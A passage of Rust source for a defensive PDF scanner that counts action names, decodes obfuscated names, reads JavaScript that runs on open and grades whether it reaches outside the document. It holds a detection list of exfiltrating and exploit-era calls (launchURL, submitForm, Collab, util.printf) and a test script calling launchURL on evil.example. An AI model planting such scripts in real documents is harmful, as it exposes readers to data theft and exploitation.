//! PDFs, read the way pdfid does: count the names that make a PDF do
//! things, outside its stream data and with `#xx` escapes decoded first (a
//! name written `/J#61vaScript` is hiding). Object streams are inflated so
//! a catalog hidden in one still counts. A script that runs when the file
//! opens is read (a literal, hex or UTF-16 string, or a stream, inflated)
//! and quoted, so the finding says what it does: one that reaches outside
//! the document fails, one that prints or pops up a menu warns, an empty
//! one is nothing. Embedded files are named. Nothing is rendered or run.

use super::deflate::inflate;
use super::{Doc, MAX_MEMBER, find, looks_like_text, push, rfind};

/// The `%PDF-` header has to be in the first KiB.
const HEADER_WINDOW: usize = 1024;
/// Data after the last `%%EOF` is a trailer worth a warning past this much.
const MAX_TRAILER: usize = 1024;
/// A referenced object without `endobj` is read up to here.
const OBJECT_WINDOW: usize = 4000;
/// Where an object's dictionary is looked for when its `obj` is missing.
const DICT_LOOKBACK: usize = 2048;
/// The most of a script read, inflated or not.
const MAX_SCRIPT: usize = 256 << 10;
/// Scripts that run on open are followed up to this many; file
/// specifications are read up to this many.
const MAX_ACTIONS: usize = 8;
const MAX_FILESPECS: usize = 16;
/// How much of a script's first line the finding quotes.
const QUOTE_LEN: usize = 80;

/// The names whose hex-escaped spelling is a PDF hiding what it does.
const ACTION_NAMES: &[&str] = &[
    "/JS",
    "/JavaScript",
    "/OpenAction",
    "/AA",
    "/Launch",
    "/EmbeddedFile",
    "/XFA",
    "/RichMedia",
    "/SubmitForm",
    "/GoToR",
    "/URI",
];

/// What a `.pdf`'s bytes say, when they are not a program.
pub(super) fn scan(file: &str, bytes: &[u8], out: &mut Vec<Doc>) {
    let head = &bytes[..bytes.len().min(HEADER_WINDOW)];
    if find(head, b"%PDF-").is_none() {
        let what = if bytes.starts_with(b"PK\x03\x04") {
            "a zip archive"
        } else if bytes.starts_with(b"{\\rt") {
            "an RTF document"
        } else if looks_like_text(bytes) && find(head, b"<").is_some() {
            "markup (HTML or XML)"
        } else {
            "something else"
        };
        push(out, file, "DOC-POLYGLOT", format!("no %PDF header in the first KiB: the file starts as {what}"), true);
        return;
    }
    let (decoded, escaped) = decode_names(&text_outside_streams(bytes));
    let count = |name: &[u8]| count_names(&decoded, name);
    let js = count(b"/JS") + count(b"/JavaScript");
    let open = count(b"/OpenAction") + count(b"/AA");
    let launch = count(b"/Launch");
    let embedded = count(b"/EmbeddedFile");
    let xfa = count(b"/XFA");
    let rich = count(b"/RichMedia");
    let submit = count(b"/SubmitForm") + count(b"/GoToR") + count(b"/ImportData");
    let objstm = count(b"/ObjStm");
    let hidden = if objstm > 0 { format!("; {objstm} object stream(s) inflated and read") } else { String::new() };
    if launch > 0 {
        push(
            out,
            file,
            "DOC-LAUNCH",
            format!("a /Launch action: the PDF asks the viewer to start a program{hidden}"),
            true,
        );
    }
    if !escaped.is_empty() {
        push(
            out,
            file,
            "DOC-OBFUSCATED",
            format!("action names written with hex escapes ({}): a PDF hiding what it does", escaped.join(", ")),
            true,
        );
    }
    let actions = if js > 0 { open_actions(&decoded) } else { Vec::new() };
    if !actions.is_empty() {
        let scripts: Vec<Option<String>> =
            actions.iter().map(|a| a.and_then(|a| js_value(bytes, &decoded, a)).map(|v| text_of(&v))).collect();
        grade_open_scripts(file, &scripts, count(b"/JS"), &hidden, out);
    } else if js > 0 {
        let quoted = find_name(&decoded, b"/JS")
            .and_then(|at| js_value(bytes, &decoded, &decoded[at..]))
            .map(|v| quote(&text_of(&v)))
            .filter(|q| !q.is_empty())
            .map(|q| format!("; the first reads `{q}`"))
            .unwrap_or_default();
        push(
            out,
            file,
            "DOC-JAVASCRIPT",
            format!(
                "JavaScript inside the PDF ({js} reference(s)){}: form-field scripts look like this, so do exploits{hidden}{quoted}",
                if open > 0 { " beside an open action that doesn't run it" } else { "" }
            ),
            false,
        );
    }
    if embedded > 0 {
        let names = embedded_names(&decoded);
        let named = if names.is_empty() {
            " (name not found)".to_string()
        } else {
            format!(" ({}{})", names.join(", "), if embedded > names.len() { ", …" } else { "" })
        };
        push(
            out,
            file,
            "DOC-EMBEDDED",
            format!("{embedded} embedded file(s){named}: a PDF carrying another file"),
            false,
        );
    }
    if xfa > 0 || rich > 0 || submit > 0 {
        let mut what = Vec::new();
        if xfa > 0 {
            what.push("an XFA form");
        }
        if rich > 0 {
            what.push("rich media (Flash-era content)");
        }
        if submit > 0 {
            what.push("a submit, remote-goto or import action");
        }
        push(out, file, "DOC-FORM", format!("{}: active content older viewers mishandle", what.join(", ")), false);
    }
    if let Some(eof) = rfind(bytes, b"%%EOF") {
        let trailer = bytes.len().saturating_sub(eof + 5);
        if trailer > MAX_TRAILER {
            push(
                out,
                file,
                "DOC-TRAILER",
                format!("{} KiB after the last %%EOF: data the PDF reader never shows", trailer >> 10),
                false,
            );
        }
    }
}

/// The JavaScript actions that run when the file opens: the entries of
/// the document-level name tree (`/JavaScript` as a key of `/Names`, not
/// the value of `/S`; one level of `/Kids` followed) and an `/OpenAction`
/// that is a JavaScript action, inline or by reference. Field and page
/// scripts (`/AA`, `/A` on an annotation) run on events, and a form full
/// of them is ordinary. `None` is an action that is there but whose
/// object couldn't be found: not nothing. At most `MAX_ACTIONS`.
fn open_actions(text: &[u8]) -> Vec<Option<&[u8]>> {
    let mut out = Vec::new();
    let mut from = 0;
    while let Some(i) = find(&text[from..], b"/JavaScript") {
        let at = from + i;
        from = at + 11;
        let is_name = text.get(at + 11).is_none_or(|c| !is_name_char(*c));
        let before: Vec<u8> =
            text[..at].iter().rev().skip_while(|c| c.is_ascii_whitespace()).take(2).copied().collect();
        if !is_name || before == b"S/" {
            continue;
        }
        // A key, as in `/Names << /JavaScript 7 0 R >>`: its value is the tree.
        match value_dict(text, &text[at + 11..]) {
            Some(tree) => tree_actions(text, tree, &mut out, true),
            None => out.push(None),
        }
        if out.len() >= MAX_ACTIONS {
            break;
        }
    }
    from = 0;
    while let Some(i) = find(&text[from..], b"/OpenAction") {
        let at = from + i + 11;
        from = at;
        if let Some(action) = value_dict(text, &text[at..])
            && is_js_action(action)
        {
            out.push(Some(action));
        }
        if out.len() >= MAX_ACTIONS {
            break;
        }
    }
    // A page's `/AA << /O … >>` (and an annotation's `/PO`) fires when the
    // page is shown: for the first page, that is when the file opens.
    from = 0;
    while let Some(i) = find_name(&text[from..], b"/AA") {
        let at = from + i + 3;
        from = at;
        if let Some(aa) = value_dict(text, &text[at..]) {
            for key in [&b"/O"[..], b"/PO"] {
                if let Some(k) = find_name(aa, key)
                    && let Some(action) = value_dict(text, &aa[k + key.len()..])
                    && is_js_action(action)
                {
                    out.push(Some(action));
                }
            }
        }
        if out.len() >= MAX_ACTIONS {
            break;
        }
    }
    out.truncate(MAX_ACTIONS);
    out
}

/// An action dictionary that is a JavaScript action.
fn is_js_action(action: &[u8]) -> bool {
    find(action, b"/JavaScript").is_some() || count_names(action, b"/JS") > 0
}

/// The actions a name tree holds: every reference or inline dictionary in
/// its `/Names` array, and one level of `/Kids`.
fn tree_actions<'a>(text: &'a [u8], tree: &'a [u8], out: &mut Vec<Option<&'a [u8]>>, follow_kids: bool) {
    if let Some(i) = find_name(tree, b"/Names") {
        array_entries(text, array_at(&tree[i + 6..]), out);
    }
    if follow_kids && let Some(i) = find_name(tree, b"/Kids") {
        let mut kids = Vec::new();
        array_entries(text, array_at(&tree[i + 5..]), &mut kids);
        for kid in kids {
            match kid {
                Some(kid) => tree_actions(text, kid, out, false),
                None => out.push(None),
            }
            if out.len() >= MAX_ACTIONS {
                return;
            }
        }
    }
}

/// The dictionaries an array holds, inline or by reference, strings skipped.
fn array_entries<'a>(text: &'a [u8], arr: &'a [u8], out: &mut Vec<Option<&'a [u8]>>) {
    let mut i = 0;
    while i < arr.len() && out.len() < MAX_ACTIONS {
        match arr[i] {
            b'(' => i += literal_len(&arr[i..]),
            b'<' if arr.get(i + 1) == Some(&b'<') => {
                let d = dict_at(&arr[i..]);
                out.push(Some(d));
                i += d.len().max(2);
            }
            b'0'..=b'9' if i == 0 || !is_name_char(arr[i - 1]) => {
                if is_reference(&arr[i..]) {
                    out.push(referenced_object(text, &arr[i..]));
                }
                i += arr[i..].iter().take_while(|c| c.is_ascii_digit()).count();
            }
            _ => i += 1,
        }
    }
}

/// The dictionary a value is: inline (`<< … >>`) or the object a
/// reference points at. A bare object number is followed too (TCPDF writes
/// `/Names << /JavaScript 15 >>`, no `0 R`; a viewer that is as lenient
/// runs what it finds there). `None` for anything else, or a reference to
/// an object that isn't there.
fn value_dict<'a>(text: &'a [u8], rest: &'a [u8]) -> Option<&'a [u8]> {
    let rest = skip_ws(rest);
    if rest.starts_with(b"<<") {
        Some(dict_at(rest))
    } else if is_reference(rest) || bare_number(rest) {
        referenced_object(text, rest)
    } else {
        None
    }
}

/// `rest` starts with an integer and then a delimiter: an object number
/// written without its `0 R`.
fn bare_number(rest: &[u8]) -> bool {
    let digits = rest.iter().take_while(|c| c.is_ascii_digit()).count();
    digits > 0 && rest.get(digits).is_none_or(|c| !is_name_char(*c))
}

/// `rest` starts with an indirect reference, `N G R`.
fn is_reference(rest: &[u8]) -> bool {
    let mut i = rest.iter().take_while(|c| c.is_ascii_digit()).count();
    if i == 0 {
        return false;
    }
    let ws = rest[i..].iter().take_while(|c| c.is_ascii_whitespace()).count();
    i += ws;
    let generation = rest[i..].iter().take_while(|c| c.is_ascii_digit()).count();
    if ws == 0 || generation == 0 {
        return false;
    }
    i += generation;
    let ws = rest[i..].iter().take_while(|c| c.is_ascii_whitespace()).count();
    i += ws;
    ws > 0 && rest.get(i) == Some(&b'R') && rest.get(i + 1).is_none_or(|c| !is_name_char(*c))
}

fn skip_ws(s: &[u8]) -> &[u8] {
    &s[s.iter().take_while(|c| c.is_ascii_whitespace()).count()..]
}

/// `s` from its leading `<<` to the matching `>>`, nesting counted, or up
/// to `OBJECT_WINDOW` when unclosed.
fn dict_at(s: &[u8]) -> &[u8] {
    let mut depth = 0usize;
    let mut i = 0;
    let end = s.len().min(OBJECT_WINDOW);
    while i < end {
        if s[i..].starts_with(b"<<") {
            depth += 1;
            i += 2;
        } else if s[i..].starts_with(b">>") {
            depth = depth.saturating_sub(1);
            i += 2;
            if depth == 0 {
                return &s[..i];
            }
        } else if s[i] == b'(' {
            i += literal_len(&s[i..]);
        } else {
            i += 1;
        }
    }
    &s[..end]
}

/// The array that starts `s` (after whitespace), `[` to its matching `]`;
/// empty when there is none.
fn array_at(s: &[u8]) -> &[u8] {
    let s = skip_ws(s);
    if !s.starts_with(b"[") {
        return &[];
    }
    let mut depth = 0usize;
    let mut i = 0;
    let end = s.len().min(OBJECT_WINDOW);
    while i < end {
        match s[i] {
            b'[' => depth += 1,
            b']' => {
                depth -= 1;
                if depth == 0 {
                    return &s[1..i];
                }
            }
            b'(' => {
                i += literal_len(&s[i..]);
                continue;
            }
            _ => {}
        }
        i += 1;
    }
    &s[1..end]
}

/// The first occurrence of a PDF name followed by a delimiter.
fn find_name(hay: &[u8], name: &[u8]) -> Option<usize> {
    let mut from = 0;
    while let Some(i) = find(&hay[from..], name) {
        let at = from + i;
        if hay.get(at + name.len()).is_none_or(|c| !is_name_char(*c)) {
            return Some(at);
        }
        from = at + name.len();
    }
    None
}

/// The body of object `N` when `rest` starts with `N 0 R`, up to `endobj`.
fn referenced_object<'a>(text: &'a [u8], rest: &[u8]) -> Option<&'a [u8]> {
    let digits: Vec<u8> = rest.iter().take_while(|c| c.is_ascii_digit()).copied().collect();
    if digits.is_empty() {
        return None;
    }
    let needle = format!("{} 0 obj", String::from_utf8_lossy(&digits));
    let mut from = 0;
    while let Some(i) = find(&text[from..], needle.as_bytes()) {
        let at = from + i;
        from = at + needle.len();
        if at == 0 || !text[at - 1].is_ascii_digit() {
            let start = at + needle.len();
            let end =
                find(&text[start..], b"endobj").map(|e| start + e).unwrap_or((start + OBJECT_WINDOW).min(text.len()));
            return Some(&text[start..end]);
        }
    }
    None
}

// --- What a script says ----------------------------------------------------

/// The `/JS` value of an action dictionary, as bytes: a literal string with
/// its escapes undone, a hex string decoded, or the object a reference
/// points at (a string, or a stream read from `raw`, inflated when it is
/// FlateDecode). `None` when it can't be read, which is not the same as
/// empty.
fn js_value(raw: &[u8], text: &[u8], dict: &[u8]) -> Option<Vec<u8>> {
    let at = find_name(dict, b"/JS")?;
    let rest = skip_ws(&dict[at + 3..]);
    if let Some(s) = string_at(rest) {
        return Some(s);
    }
    if !is_reference(rest) {
        return None;
    }
    if let Some(obj) = referenced_object(text, rest)
        && let Some(s) = string_at(skip_ws(obj))
    {
        return Some(s);
    }
    stream_data(raw, rest)
}

/// The string `rest` starts with, `(…)` or `<hex>`, decoded; `None` when
/// it starts with something else.
fn string_at(rest: &[u8]) -> Option<Vec<u8>> {
    match rest.first()? {
        b'(' => Some(literal_string(rest)),
        b'<' if rest.get(1) != Some(&b'<') => Some(hex_string(rest)),
        _ => None,
    }
}

/// The first string value of `key` in `dict`: a reference or a dictionary
/// under the same key is skipped (`/EF << /F 5 0 R >>` beside `/F (name)`).
fn string_value(dict: &[u8], key: &[u8]) -> Option<Vec<u8>> {
    let mut from = 0;
    while let Some(i) = find_name(&dict[from..], key) {
        let at = from + i + key.len();
        from = at;
        if let Some(s) = string_at(skip_ws(&dict[at..])) {
            return Some(s);
        }
    }
    None
}

/// The length of the literal string `s` starts with, parens and all:
/// nesting balanced, escapes skipped, the whole of `s` when unclosed.
fn literal_len(s: &[u8]) -> usize {
    let mut depth = 0usize;
    let mut i = 0;
    while i < s.len() {
        match s[i] {
            b'\\' => i += 1,
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    return i + 1;
                }
            }
            _ => {}
        }
        i += 1;
    }
    s.len()
}

/// The bytes of the literal string `s` starts with, escapes undone (`\n`,
/// `\(`, `\\`, octal `\ddd`, a backslash-newline continuation), at most
/// `MAX_SCRIPT` of them.
fn literal_string(s: &[u8]) -> Vec<u8> {
    let body = &s[1..literal_len(s).saturating_sub(1).max(1)];
    let mut out = Vec::with_capacity(body.len().min(MAX_SCRIPT));
    let mut i = 0;
    while i < body.len() && out.len() < MAX_SCRIPT {
        let c = body[i];
        i += 1;
        if c != b'\\' {
            out.push(c);
            continue;
        }
        let Some(&e) = body.get(i) else { break };
        i += 1;
        match e {
            b'n' => out.push(b'\n'),
            b'r' => out.push(b'\r'),
            b't' => out.push(b'\t'),
            b'b' => out.push(8),
            b'f' => out.push(12),
            b'\n' => {}
            b'\r' => {
                if body.get(i) == Some(&b'\n') {
                    i += 1;
                }
            }
            b'0'..=b'7' => {
                let mut v = (e - b'0') as u32;
                for _ in 0..2 {
                    match body.get(i) {
                        Some(d @ b'0'..=b'7') => {
                            v = (v << 3) | (d - b'0') as u32;
                            i += 1;
                        }
                        _ => break,
                    }
                }
                out.push(v as u8);
            }
            other => out.push(other),
        }
    }
    out
}

/// The bytes of the hex string `s` starts with (`<48656C6C6F>`), whitespace
/// ignored, an odd last digit padded, at most `MAX_SCRIPT` of them.
fn hex_string(s: &[u8]) -> Vec<u8> {
    let end = find(s, b">").unwrap_or(s.len());
    let digits: Vec<u8> = s[1..end].iter().filter(|c| c.is_ascii_hexdigit()).take(MAX_SCRIPT * 2).copied().collect();
    digits.chunks(2).map(|pair| (hex(pair[0]) << 4) | pair.get(1).map(|d| hex(*d)).unwrap_or(0)).collect()
}

/// The data of stream object `N` in the raw file when `rest` starts with
/// `N 0 R`: inflated when its filter is FlateDecode, as is when it has no
/// filter, `None` for any other filter or a missing object.
fn stream_data(raw: &[u8], rest: &[u8]) -> Option<Vec<u8>> {
    let digits: Vec<u8> = rest.iter().take_while(|c| c.is_ascii_digit()).copied().collect();
    let needle = format!("{} 0 obj", String::from_utf8_lossy(&digits));
    let mut from = 0;
    while let Some(i) = find(&raw[from..], needle.as_bytes()) {
        let at = from + i;
        from = at + needle.len();
        if at > 0 && raw[at - 1].is_ascii_digit() {
            continue;
        }
        let start = at + needle.len();
        let window = &raw[start..(start + OBJECT_WINDOW).min(raw.len())];
        let stream_at = find(window, b"stream")?;
        if find(&window[..stream_at], b"endobj").is_some() {
            return None;
        }
        let dict = &window[..stream_at];
        let mut d = start + stream_at + 6;
        if raw.get(d) == Some(&b'\r') {
            d += 1;
        }
        if raw.get(d) == Some(&b'\n') {
            d += 1;
        }
        let end = find(&raw[d..], b"endstream").map(|e| d + e).unwrap_or(raw.len());
        let data = &raw[d..end];
        return if find(dict, b"/FlateDecode").is_some() {
            inflate_stream(data, MAX_SCRIPT)
        } else if find(dict, b"/Filter").is_some() {
            None
        } else {
            Some(data[..data.len().min(MAX_SCRIPT)].to_vec())
        };
    }
    None
}

/// A PDF text string as text: UTF-16 with a byte-order mark either way
/// round, UTF-8 with or without one, or bytes taken as they are.
fn text_of(bytes: &[u8]) -> String {
    if bytes.starts_with(&[0xFE, 0xFF]) {
        let units = bytes[2..].chunks(2).map(|p| u16::from_be_bytes([p[0], *p.get(1).unwrap_or(&0)]));
        char::decode_utf16(units).map(|c| c.unwrap_or(char::REPLACEMENT_CHARACTER)).collect()
    } else if bytes.starts_with(&[0xFF, 0xFE]) {
        let units = bytes[2..].chunks(2).map(|p| u16::from_le_bytes([p[0], *p.get(1).unwrap_or(&0)]));
        char::decode_utf16(units).map(|c| c.unwrap_or(char::REPLACEMENT_CHARACTER)).collect()
    } else {
        String::from_utf8_lossy(bytes.strip_prefix(&[0xEF, 0xBB, 0xBF]).unwrap_or(bytes)).into_owned()
    }
}

/// The first line of a script with something on it, whitespace collapsed,
/// about `QUOTE_LEN` characters: enough to recognize it.
fn quote(script: &str) -> String {
    let line = script.lines().map(str::trim).find(|l| !l.is_empty()).unwrap_or("");
    let one: String = line.split_whitespace().collect::<Vec<_>>().join(" ");
    let mut q: String = one.chars().filter(|c| !c.is_control()).take(QUOTE_LEN).collect();
    if one.chars().count() > QUOTE_LEN {
        q.push('…');
    }
    q
}

/// The calls that take a script outside the document: a URL, a server, a
/// mail client, the disk, another document, the exploit-era objects. Bare
/// method names, so `app['launchURL']` counts too.
const REACHES_OUT: &[(&str, &str)] = &[
    ("launchURL", "opens a URL (app.launchURL)"),
    ("submitForm", "sends form data to a server (submitForm)"),
    ("exportDataObject", "writes an embedded file to disk (exportDataObject)"),
    ("openDoc", "opens another document (app.openDoc)"),
    ("getURL", "fetches a URL (getURL)"),
    ("Net.HTTP", "makes HTTP requests (Net.HTTP)"),
    ("mailMsg", "sends mail (app.mailMsg)"),
    ("Collab.", "calls the Collab object, an exploit's usual door"),
    ("util.printf", "calls util.printf, the CVE-2008-2992 overflow"),
];
/// A decoder (`eval`, `unescape`, `String.fromCharCode`) over this many
/// `%u`, `\x` or `\u` escapes, or a hex run this long, is a payload.
const ESCAPES_IN_A_PAYLOAD: usize = 16;
const HEX_RUN_IN_A_PAYLOAD: usize = 200;

/// Why a script reaches outside the document, when it does.
fn reaches_out(script: &str) -> Option<&'static str> {
    if let Some((_, why)) = REACHES_OUT.iter().find(|(call, _)| script.contains(call)) {
        return Some(why);
    }
    let decodes = ["eval(", "unescape(", "fromCharCode("].iter().any(|d| script.contains(d));
    if !decodes {
        return None;
    }
    let escapes = script.matches("%u").count() + script.matches("\\x").count() + script.matches("\\u").count();
    let mut hex_run = 0usize;
    let mut longest = 0usize;
    for c in script.chars() {
        hex_run = if c.is_ascii_hexdigit() { hex_run + 1 } else { 0 };
        longest = longest.max(hex_run);
    }
    (escapes >= ESCAPES_IN_A_PAYLOAD || longest >= HEX_RUN_IN_A_PAYLOAD)
        .then_some("decodes a long escaped payload with eval, unescape or String.fromCharCode")
}

/// The script with its string literals emptied and its comments removed,
/// so braces and keywords in them don't count.
fn code_only(script: &str) -> String {
    let cs: Vec<char> = script.chars().collect();
    let mut out = String::with_capacity(cs.len());
    let mut i = 0;
    while i < cs.len() {
        let c = cs[i];
        if c == '"' || c == '\'' || c == '`' {
            i += 1;
            while i < cs.len() && cs[i] != c {
                i += if cs[i] == '\\' { 2 } else { 1 };
            }
            i += 1;
            out.push_str("\"\"");
        } else if c == '/' && cs.get(i + 1) == Some(&'/') {
            while i < cs.len() && cs[i] != '\n' {
                i += 1;
            }
        } else if c == '/' && cs.get(i + 1) == Some(&'*') {
            i += 2;
            while i < cs.len() && !(cs[i] == '*' && cs.get(i + 1) == Some(&'/')) {
                i += 1;
            }
            i += 2;
        } else {
            out.push(c);
            i += 1;
        }
    }
    out
}

/// The names of the functions a script defines, when defining them is all
/// it does at its top level (KiCad's `ShM`, a form's helpers): nothing runs
/// until a link or a field calls one. `None` when anything else runs at
/// the top level, or the braces don't balance.
fn defined_functions(script: &str) -> Option<Vec<String>> {
    let cs: Vec<char> = code_only(script).chars().collect();
    let mut names = Vec::new();
    let mut depth = 0usize;
    let mut i = 0;
    let ws = |i: &mut usize| {
        while *i < cs.len() && cs[*i].is_whitespace() {
            *i += 1;
        }
    };
    while i < cs.len() {
        let c = cs[i];
        if depth > 0 {
            match c {
                '{' => depth += 1,
                '}' => depth -= 1,
                _ => {}
            }
            i += 1;
            continue;
        }
        if c.is_whitespace() || c == ';' {
            i += 1;
            continue;
        }
        if !cs[i..].starts_with(&['f', 'u', 'n', 'c', 't', 'i', 'o', 'n'])
            || !cs.get(i + 8).is_some_and(|c| c.is_whitespace())
        {
            return None;
        }
        i += 8;
        ws(&mut i);
        let name: String = cs[i..].iter().take_while(|c| c.is_alphanumeric() || **c == '_' || **c == '$').collect();
        if name.is_empty() {
            return None;
        }
        i += name.chars().count();
        ws(&mut i);
        if cs.get(i) != Some(&'(') {
            return None;
        }
        let mut parens = 0usize;
        while i < cs.len() {
            match cs[i] {
                '(' => parens += 1,
                ')' => parens -= 1,
                _ => {}
            }
            i += 1;
            if parens == 0 {
                break;
            }
        }
        ws(&mut i);
        if cs.get(i) != Some(&'{') {
            return None;
        }
        depth = 1;
        i += 1;
        names.push(name);
    }
    (depth == 0).then_some(names)
}

/// The finding for the scripts that run when the file opens: a fail when
/// one can't be read or reaches outside the document, or only defines
/// functions that do and another open-time script calls one; nothing when
/// every one is empty (TCPDF writes an empty names-tree entry) and no
/// other `/JS` is left unread; otherwise a warning with the script quoted.
fn grade_open_scripts(file: &str, scripts: &[Option<String>], js_keys: usize, hidden: &str, out: &mut Vec<Doc>) {
    if scripts.iter().any(Option::is_none) {
        push(
            out,
            file,
            "DOC-JS-ON-OPEN",
            format!(
                "JavaScript wired to the open action or the document's name tree runs when the file is opened, and its script could not be read (an object that isn't there, or a filter this reader doesn't inflate){hidden}"
            ),
            true,
        );
        return;
    }
    let texts: Vec<&str> = scripts.iter().flatten().map(String::as_str).collect();
    // Functions defined at open that reach out when called: (name, why, script).
    let mut defined: Vec<(String, &str, &str)> = Vec::new();
    for text in &texts {
        let Some(why) = reaches_out(text) else { continue };
        match defined_functions(text) {
            Some(names) => defined.extend(names.into_iter().map(|n| (n, why, *text))),
            None => {
                push(
                    out,
                    file,
                    "DOC-JS-ON-OPEN",
                    format!("JavaScript runs when the file is opened and {why}: `{}`{hidden}", quote(text)),
                    true,
                );
                return;
            }
        }
    }
    for text in &texts {
        if let Some((name, why, _)) =
            defined.iter().find(|(name, _, from)| from != text && text.contains(&format!("{name}(")))
        {
            push(
                out,
                file,
                "DOC-JS-ON-OPEN",
                format!(
                    "JavaScript runs when the file is opened and calls {name}(), defined at open, which {why}: `{}`{hidden}",
                    quote(text)
                ),
                true,
            );
            return;
        }
    }
    if let Some((name, why, text)) = defined.first() {
        push(
            out,
            file,
            "DOC-JAVASCRIPT",
            format!(
                "JavaScript runs when the file is opened and only defines functions for links and fields to call; {name}() {why} when called: `{}`{hidden}",
                quote(text)
            ),
            false,
        );
        return;
    }
    match texts.iter().find(|t| !t.trim().is_empty()) {
        Some(text) => push(
            out,
            file,
            "DOC-JAVASCRIPT",
            format!(
                "JavaScript runs when the file is opened but stays inside the document (prints, alerts, pop-ups, field formatting): `{}`{hidden}",
                quote(text)
            ),
            false,
        ),
        None if js_keys > scripts.len() => push(
            out,
            file,
            "DOC-JAVASCRIPT",
            format!(
                "the script that runs when the file is opened is empty, and {} other /JS reference(s) were not read: form-field scripts look like this, so do exploits{hidden}",
                js_keys - scripts.len()
            ),
            false,
        ),
        None => {} // an empty script does nothing
    }
}

/// The names of the files a PDF carries: the `/UF` (Unicode) or `/F`
/// string of the file specification around each `/EF` entry, at most
/// three, so the reader can judge a `.joboptions` from a `.exe`.
fn embedded_names(text: &[u8]) -> Vec<String> {
    let mut names = Vec::new();
    let mut from = 0;
    let mut seen = 0;
    while let Some(i) = find_name(&text[from..], b"/EF") {
        let at = from + i;
        from = at + 3;
        seen += 1;
        let start = rfind(&text[..at], b" obj").map(|o| o + 4).unwrap_or(at.saturating_sub(DICT_LOOKBACK));
        let end = find(&text[at..], b"endobj").map(|e| at + e).unwrap_or((at + OBJECT_WINDOW).min(text.len()));
        let spec = &text[start..end];
        if let Some(name) = string_value(spec, b"/UF").or_else(|| string_value(spec, b"/F")) {
            let name = quote(&text_of(&name));
            if !name.is_empty() && !names.contains(&name) {
                names.push(name);
            }
        }
        if names.len() >= 3 || seen >= MAX_FILESPECS {
            break;
        }
    }
    names
}

/// A FlateDecode stream inflated: zlib-wrapped (RFC 1950, as every PDF
/// writer emits it: a two-byte header whose check passes) or raw DEFLATE.
/// The Adler-32 trailer is left to the inflater to stop before.
fn inflate_stream(data: &[u8], max: usize) -> Option<Vec<u8>> {
    let zlib = data.len() >= 2 && data[0] & 0x0F == 8 && u16::from_be_bytes([data[0], data[1]]).is_multiple_of(31);
    inflate(if zlib { &data[2..] } else { data }, max)
}

/// The PDF outside its stream data, with object streams (`/ObjStm`,
/// FlateDecode) inflated and appended: dictionaries live there, and the
/// bytes of a compressed image don't get to spell `/JS` by chance.
fn text_outside_streams(bytes: &[u8]) -> Vec<u8> {
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len() / 2);
    let mut i = 0;
    while i < bytes.len() {
        let Some(k) = find(&bytes[i..], b"stream") else {
            out.extend_from_slice(&bytes[i..]);
            break;
        };
        let at = i + k;
        if at >= 3 && &bytes[at - 3..at] == b"end" {
            // a stray "endstream": text, not a stream start
            out.extend_from_slice(&bytes[i..at + 6]);
            i = at + 6;
            continue;
        }
        out.extend_from_slice(&bytes[i..at]);
        let mut d = at + 6;
        if bytes.get(d) == Some(&b'\r') {
            d += 1;
        }
        if bytes.get(d) == Some(&b'\n') {
            d += 1;
        }
        let end = find(&bytes[d..], b"endstream").map(|e| d + e).unwrap_or(bytes.len());
        let dict_start = rfind(&out, b" obj").unwrap_or(out.len().saturating_sub(DICT_LOOKBACK));
        let object_stream = {
            let dict = &out[dict_start..];
            find(dict, b"/ObjStm").is_some() && find(dict, b"/FlateDecode").is_some()
        };
        if object_stream && let Some(inflated) = inflate_stream(&bytes[d..end], MAX_MEMBER) {
            out.push(b'\n');
            out.extend_from_slice(&inflated);
            out.push(b'\n');
        }
        out.extend_from_slice(b"endstream");
        i = (end + 9).min(bytes.len());
    }
    out
}

/// The bytes with `/Na#6de` written as `/Name`, and the action names that
/// needed it.
fn decode_names(bytes: &[u8]) -> (Vec<u8>, Vec<String>) {
    let mut out = Vec::with_capacity(bytes.len());
    let mut escaped = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        let b = bytes[i];
        if b == b'/' {
            let start = out.len();
            out.push(b);
            i += 1;
            let mut had_escape = false;
            while i < bytes.len() {
                let c = bytes[i];
                if c == b'#'
                    && i + 2 < bytes.len()
                    && bytes[i + 1].is_ascii_hexdigit()
                    && bytes[i + 2].is_ascii_hexdigit()
                {
                    let v = (hex(bytes[i + 1]) << 4) | hex(bytes[i + 2]);
                    out.push(v);
                    had_escape = true;
                    i += 3;
                } else if is_name_char(c) {
                    out.push(c);
                    i += 1;
                } else {
                    break;
                }
            }
            if had_escape {
                let name = String::from_utf8_lossy(&out[start..]).into_owned();
                if ACTION_NAMES.contains(&name.as_str()) && !escaped.contains(&name) {
                    escaped.push(name);
                }
            }
            continue;
        }
        out.push(b);
        i += 1;
    }
    (out, escaped)
}

/// A byte that continues a PDF name (anything else is a delimiter).
fn is_name_char(c: u8) -> bool {
    c.is_ascii_alphanumeric() || c == b'_' || c == b'-' || c == b'.'
}

fn hex(c: u8) -> u8 {
    match c {
        b'0'..=b'9' => c - b'0',
        b'a'..=b'f' => c - b'a' + 10,
        b'A'..=b'F' => c - b'A' + 10,
        _ => 0,
    }
}

/// Occurrences of a PDF name followed by a delimiter (so `/JS` doesn't
/// count `/JScript`).
fn count_names(hay: &[u8], name: &[u8]) -> usize {
    let mut n = 0;
    let mut from = 0;
    while let Some(i) = find(&hay[from..], name) {
        let at = from + i;
        if hay.get(at + name.len()).is_none_or(|c| !is_name_char(*c)) {
            n += 1;
        }
        from = at + name.len();
    }
    n
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::documents::{ids, scan_bytes};

    #[test]
    fn an_open_action_alone_is_a_page_to_open_at() {
        let plain = b"%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >> endobj\n%%EOF\n";
        assert!(scan_bytes("a.pdf", plain).is_empty());
    }

    #[test]
    fn javascript_on_open_is_graded_by_what_it_does() {
        // An alert stays inside the document: a warning that quotes it.
        let alert =
            b"%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj\n%%EOF";
        let got = scan_bytes("a.pdf", alert);
        assert_eq!(ids(&got), [("DOC-JAVASCRIPT", false)], "{got:?}");
        assert!(got[0].note.contains("runs when the file is opened but stays inside the document"), "{}", got[0].note);
        assert!(got[0].note.contains("`app.alert(1)`"), "{}", got[0].note);
        // A URL, a server, mail, the disk: out of the document, a fail that says how.
        for (script, why) in [
            ("app.launchURL(\"https://evil.example/x\", true)", "opens a URL"),
